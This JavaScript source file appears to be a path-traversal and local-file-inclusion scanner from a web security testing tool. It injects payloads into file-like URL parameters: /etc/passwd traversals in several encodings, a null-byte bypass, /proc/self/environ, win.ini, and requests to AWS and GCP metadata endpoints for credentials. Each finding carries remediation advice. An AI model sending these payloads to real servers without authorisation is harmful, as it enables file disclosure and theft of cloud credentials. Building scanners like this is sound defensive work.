import { createFinding } from '../../utils/finding.js';

/**
 * PathTraversalScanner — Tests for path traversal and local file inclusion (LFI).
 *
 * Targets:
 * - URL path parameters (/download?file=, /view?path=, /image?src=)
 * - Upload URL parameters
 * - API file-serving endpoints
 *
 * Payloads include:
 * - Unix path traversal: ../../../etc/passwd
 * - Windows path traversal: ..\..\..\windows\win.ini
 * - URL encoding: %2e%2e%2f
 * - Double encoding: %252e%252e%252f
 * - Null byte: ../../../etc/passwd%00.png
 */
export class PathTraversalScanner {
    constructor(logger) {
        this.logger = logger;

        this.FILE_PARAMS = [
            'file', 'path', 'filename', 'filepath', 'dir', 'directory',
            'src', 'source', 'doc', 'document', 'template', 'page',
            'include', 'require', 'show', 'view', 'read', 'load',
            'img', 'image', 'photo', 'asset', 'resource', 'url', 'redirect',
        ];

        this.PAYLOADS = [
            // Unix
            { name: 'Basic Unix traversal', payload: '../../../etc/passwd', marker: /root:.*:0:0/, os: 'unix' },
            { name: 'Encoded Unix traversal', payload: '..%2F..%2F..%2Fetc%2Fpasswd', marker: /root:.*:0:0/, os: 'unix' },
            { name: 'Double-encoded traversal', payload: '..%252F..%252F..%252Fetc%252Fpasswd', marker: /root:.*:0:0/, os: 'unix' },
            { name: 'Null byte bypass', payload: '../../../etc/passwd\x00.png', marker: /root:.*:0:0/, os: 'unix' },
            { name: '/proc/self/environ exposure', payload: '../../../proc/self/environ', marker: /PATH=|HOME=|USER=/, os: 'unix' },
            { name: '/etc/hosts exposure', payload: '../../../etc/hosts', marker: /127\.0\.0\.1\s+localhost/, os: 'unix' },
            // Windows
            { name: 'Windows traversal', payload: '..\\..\\..\\windows\\win.ini', marker: /\[fonts\]/i, os: 'windows' },
            { name: 'Windows encoded traversal', payload: '..%5C..%5C..%5Cwindows%5Cwin.ini', marker: /\[fonts\]/i, os: 'windows' },
            // Cloud/container paths
            { name: 'AWS metadata', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials', marker: /AccessKeyId|SecretAccessKey/i, os: 'cloud' },
            { name: 'GCP metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', marker: /access_token|expires_in/i, os: 'cloud' },
        ];
    }

    async scan(surfaceInventory) {
        const findings = [];

        for (const page of surfaceInventory.pages) {
            if (!page.url || page.status >= 400) continue;

            const url = new URL(page.url);
            const paramNames = [...url.searchParams.keys()];

            // Find file-like parameters in the URL
            const fileParams = paramNames.filter(p =>
                this.FILE_PARAMS.some(fp => p.toLowerCase().includes(fp))
            );

            if (fileParams.length === 0) continue;

            for (const param of fileParams) {
                for (const { name, payload, marker, os } of this.PAYLOADS) {
                    try {
                        const testUrl = new URL(page.url);
                        testUrl.searchParams.set(param, payload);

                        const controller = new AbortController();
                        const timeout = setTimeout(() => controller.abort(), 10000);

                        const response = await fetch(testUrl.toString(), {
                            method: 'GET',
                            signal: controller.signal,
                        });
                        clearTimeout(timeout);

                        if (!response.ok) continue;
                        const text = await response.text();

                        if (marker.test(text)) {
                            findings.push(createFinding({
                                module: 'security',
                                title: `Path Traversal / LFI: ${name} via "${param}" parameter`,
                                severity: os === 'cloud' ? 'critical' : 'critical',
                                affected_surface: page.url,
                                description: `The parameter "${param}" at ${page.url} is vulnerable to path traversal. The payload "${payload}" successfully read a ${os === 'cloud' ? 'cloud metadata endpoint' : 'system file'}, allowing an attacker to read arbitrary files from the server's filesystem${os === 'cloud' ? ' and steal cloud credentials' : ', including application source code, configuration files, and credentials'}.`,
                                reproduction: [
                                    `1. Navigate to: ${testUrl.toString()}`,
                                    `2. Server returns contents of ${os === 'unix' ? '/etc/passwd' : os === 'windows' ? 'windows/win.ini' : 'cloud metadata endpoint'}`,
                                    '3. Escalate to reading: application config files, .env, database credentials',
                                ],
                                evidence: `Param: ${param}\nPayload: ${payload}\nResponse excerpt: ${text.substring(0, 300)}`,
                                remediation: 'Never use user-supplied input directly in file path operations. Use an allowlist of permitted filenames. Resolve and verify the canonical path is within the expected base directory (e.g., require realpath to start with /app/public/). Use chroot jails or container isolation for file serving services.',
                                references: [
                                    'https://owasp.org/www-community/attacks/Path_Traversal',
                                    'CWE-22',
                                    'CWE-98',
                                ],
                            }));
                            break; // One finding per param
                        }
                    } catch { /* continue */ }
                }
            }
        }

        this.logger?.info?.(`Path Traversal: found ${findings.length} issues`);
        return findings;
    }
}

export default PathTraversalScanner;
